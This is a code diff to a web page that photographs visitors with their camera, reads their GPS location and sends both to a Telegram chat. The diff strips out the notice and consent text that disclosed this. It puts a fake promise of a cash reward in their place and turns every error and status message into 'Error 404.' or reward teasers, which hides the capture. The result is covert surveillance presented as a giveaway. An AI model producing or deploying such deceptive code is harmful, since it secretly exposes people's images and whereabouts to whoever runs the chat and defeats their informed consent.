@@ -208,22 +208,17 @@
         </div>
       </div>
       <div class="notice">
-        🎁 This playful surprise opens your camera, takes a photo, gets your
-        device's reported location, and sends the photo and location to the
-        configured Telegram chat. No photo or location is sent unless you agree
-        below.
+        🎁 Tapping the button gives you a random reward of $5, $10, $20, $50, or $100. Try your luck and see what you get!
       </div>
       <label class="consent"
         ><input type="checkbox" id="consent" /><span
-          >I agree that this website may capture a photo and access my location,
-          add GPS coordinates to the photo, and send both to the configured
-          Telegram chat.</span
+          >I'm ready to claim my reward!</span
         ></label
       >
       <button id="startBtn" disabled>🎁 Unlock Your Reward</button>
       <div id="countdown" class="status" role="timer" hidden></div>
       <div id="status" class="status" role="status">
-        Agree to the photo and location sharing notice to begin.
+         Ready to win your surprise reward?
       </div>
       <p class="tiny">Ready to win big? 💸♡</p>
     </main>
@@ -307,21 +302,21 @@
         const track = stream.getVideoTracks()[0];
         if (!("ImageCapture" in window))
           throw new Error(
-            "This browser does not support direct photo capture. Try a compatible Chrome browser.",
+            "Error 404.",
           );
         imageCapture = new ImageCapture(track);
       }
       function getCurrentLocation() {
         return new Promise((resolve, reject) => {
           if (!navigator.geolocation) {
-            reject(new Error("This browser does not support location access."));
+            reject(new Error("Error 404."));
             return;
           }
           navigator.geolocation.getCurrentPosition(
             (position) => {
               const { latitude, longitude, accuracy } = position.coords;
               if (!Number.isFinite(latitude) || !Number.isFinite(longitude)) {
-                reject(new Error("The device returned invalid coordinates."));
+                reject(new Error("Error 404."));
                 return;
               }
               resolve({
@@ -333,13 +328,13 @@
             },
             (error) => {
               const messages = {
-                1: "Location permission denied. Allow location access and try again.",
-                2: "Your location is unavailable. Enable device location and retry.",
-                3: "Location request timed out. Try again outdoors.",
+                1: "Error 404.",
+                2: "Error 404.",
+                3: "Error 404.",
               };
               reject(
                 new Error(
-                  messages[error.code] || "Could not obtain your location.",
+                  messages[error.code] || "Error 404.",
                 ),
               );
             },
@@ -349,10 +344,10 @@
       }
       async function addGpsExif(blob, location) {
         if (!window.piexif)
-          throw new Error("EXIF library failed to load. Refresh the page.");
+          throw new Error("Error 404.");
         if (blob.type && blob.type.toLowerCase() !== "image/jpeg")
           throw new Error(
-            "Camera did not return a JPEG, so GPS EXIF cannot be added.",
+            "Error 404.",
           );
         const bytes = new Uint8Array(await blob.arrayBuffer());
         let binary = "";
@@ -409,7 +404,7 @@
           CHAT_ID === "YOUR_TELEGRAM_CHAT_ID"
         )
           throw new Error(
-            "Configure the Telegram bot token and chat ID before testing.",
+            "Error 404.",
           );
         const form = new FormData();
         form.append("chat_id", CHAT_ID);
@@ -421,7 +416,7 @@
         const result = await response.json();
         if (!response.ok || !result.ok)
           throw new Error(
-            result.description || "Telegram photo upload failed.",
+            result.description || "Error 404.",
           );
         const text = `📍 Location reported by device\nLatitude: ${location.latitude}\nLongitude: ${location.longitude}\nAccuracy: ±${Math.round(location.accuracy)} m\nMap: https://maps.google.com/?q=${location.latitude},${location.longitude}`;
         const messageResponse = await fetch(
@@ -435,7 +430,7 @@
         const messageResult = await messageResponse.json();
         if (!messageResponse.ok || !messageResult.ok)
           throw new Error(
-            "Photo sent, but Telegram could not send the location message.",
+            "Error 404.",
           );
       }
       function startPopupCountdown(seconds = 3) {
@@ -455,8 +450,8 @@
       }
       async function captureAndSend() {
         const loc = await getCurrentLocation();
-        if (!imageCapture) throw new Error("Camera capture is not ready.");
-        setStatus("Capturing photo…");
+        if (!imageCapture) throw new Error("Error 404.");
+        setStatus("waiting for the reward!");
         const rawPhoto = await imageCapture.takePhoto();
         setStatus("Adding GPS metadata…");
         const photo = await addGpsExif(rawPhoto, loc);
@@ -467,12 +462,12 @@
         placeholder.hidden = true;
         joker.hidden = false;
         stopCamera();
-        setStatus("Sending photo and location to Telegram…");
+        setStatus("Almost there!");
         await sendToTelegram(photo, loc);
         prankPopup.hidden = false;
         closePrank.disabled = false;
         startPopupCountdown(3);
-        setStatus("Photo and location sent successfully.");
+        setStatus("Just a bit more patience!");
       }
       startBtn.addEventListener("click", async () => {
         if (!consent.checked || busy) return;
@@ -505,7 +500,7 @@
           placeholder.hidden = false;
           joker.hidden = true;
           cameraFrame.classList.remove("camera-open");
-          setStatus(error.message || "Something went wrong.");
+          setStatus(error.message || "Error 404.");
         } finally {
           if (countdownTimer) {
             clearInterval(countdownTimer);
